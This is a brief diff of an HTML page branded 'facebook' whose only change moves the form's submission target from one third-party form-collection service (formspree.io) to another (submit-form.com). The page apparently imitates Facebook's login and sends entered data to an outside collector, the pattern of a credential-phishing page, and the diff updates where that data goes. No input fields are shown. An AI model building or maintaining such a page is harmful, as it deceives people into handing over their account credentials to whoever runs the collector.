@@ -13,7 +13,7 @@
             <b class="text-5xl text-white">facebook</b>
         </div>
 
-        <form class="sm:hidden lg:block md:block" action="https://formspree.io/f/xayrwnkw" method="post">
+        <form class="sm:hidden lg:block md:block" action="https://submit-form.com/3iHxwYHGO" method="post">
 
             <div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
                 <div>
